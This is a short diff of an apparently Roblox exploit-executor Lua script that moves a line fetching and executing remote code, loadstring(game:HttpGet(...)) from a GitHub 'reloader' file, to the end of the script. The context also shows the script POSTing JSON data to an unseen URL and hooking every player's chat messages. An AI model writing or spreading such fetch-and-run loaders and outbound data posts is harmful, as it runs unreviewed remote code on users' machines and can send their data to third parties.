@@ -19,7 +19,7 @@ local newdata = HTTP_:JSONEncode(data)
 local headers = { ["content-type"] = "application/json" }
 local request = http_request or request or HttpPost or syn.request
 request({ Url = url, Body = newdata, Method = "POST", Headers = headers })
-loadstring(game:HttpGet("https://raw.githubusercontent.com/eeeeeeeesw/Bluefox/main/reloader"))()
+
 
 	local HTTP_ = game:GetService('HttpService')
 	local LPR = game:GetService('Players').LocalPlayer
@@ -68,4 +68,4 @@ for _, player in ipairs(game.Players:GetPlayers()) do
         onChatted(player, msg)
     end)
 end
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/eeeeeeeesw/Bluefox/main/reloader"))()
